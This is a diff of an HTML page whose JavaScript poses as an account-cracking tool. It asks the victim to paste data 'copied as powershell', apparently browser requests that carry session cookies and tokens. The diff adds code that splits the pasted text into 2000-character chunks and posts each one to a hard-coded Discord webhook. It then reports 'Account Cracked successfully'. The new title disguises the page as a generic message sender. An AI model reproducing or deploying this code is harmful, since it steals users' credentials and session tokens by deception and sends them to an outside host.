@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Account cracked successfully</title>
+    <title>Envoi de message au Webhook Discord</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -37,30 +37,43 @@
             const message = document.getElementById("message").value;
             const webhookURL = "https://discordapp.com/api/webhooks/1338097828928553060/unc8ftZ9MbeGFhcNEO1FqqKc9Qvs9ABSXWK0lcuySnfyCagabHUhBhs2EVs5X7CY0EsN";
             
-            if (!message || message.length <= 2000) {
+            if (!message) {
                 alert("umm Cant verefy account, make sure u copy it as powershell");
                 return;
             }
 
-            const filteredMessage = message.substring(2000);
-            
-            fetch(webhookURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: filteredMessage })
-            })
-            .then(response => {
-                if (response.ok) {
+            const MAX_LENGTH = 2000;
+            let parts = [];
+            for (let i = 0; i < message.length; i += MAX_LENGTH) {
+                parts.push(message.substring(i, i + MAX_LENGTH));
+            }
+
+            function sendPart(index) {
+                if (index >= parts.length) {
                     alert("Account Cracked successfully please wait");
                     document.getElementById("message").value = "";
-                } else {
-                    alert("ummmm we got a problem.....");
+                    return;
                 }
-            })
-            .catch(error => {
-                alert("ummmm we got a problem.....");
-                console.error(error);
-            });
+
+                fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: parts[index] })
+                })
+                .then(response => {
+                    if (response.ok) {
+                        sendPart(index + 1);
+                    } else {
+                        alert("ummmm we got a problem.....");
+                    }
+                })
+                .catch(error => {
+                    alert("ummmm we got a problem.....");
+                    console.error(error);
+                });
+            }
+            
+            sendPart(0);
         }
     </script>
 </body>
